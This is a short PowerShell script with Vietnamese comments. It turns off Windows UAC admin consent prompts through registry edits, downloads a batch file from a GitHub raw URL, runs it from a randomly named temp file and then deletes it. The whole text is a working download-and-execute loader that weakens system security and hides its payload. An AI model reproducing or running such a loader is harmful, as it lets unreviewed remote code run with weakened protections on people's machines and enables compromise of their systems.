reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Đặt encoding cho PowerShell
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

# Danh sách URL chứa file thực thi
$URLs = @(
    'https://raw.githubusercontent.com/mitutina/mitutina/main/ghinhan.bat'
)

# Tải nội dung từ URL
foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try {
        $response = Invoke-WebRequest -Uri $URL -UseBasicParsing
        break
    } catch {}
}

if (-not $response) {
    Write-Host "Failed to retrieve the script from the available repository, aborting!"
    return
}

# Tạo file tạm để lưu nội dung script
$rand = [Guid]::NewGuid().Guid
$FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"

# QUAN TRỌNG: Lưu file với UTF-8 encoding
[System.IO.File]::WriteAllText($FilePath, $response.Content, [System.Text.Encoding]::UTF8)

# Thực thi file batch
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait

# Xóa file tạm sau khi thực thi
Remove-Item -Path $FilePath -Force
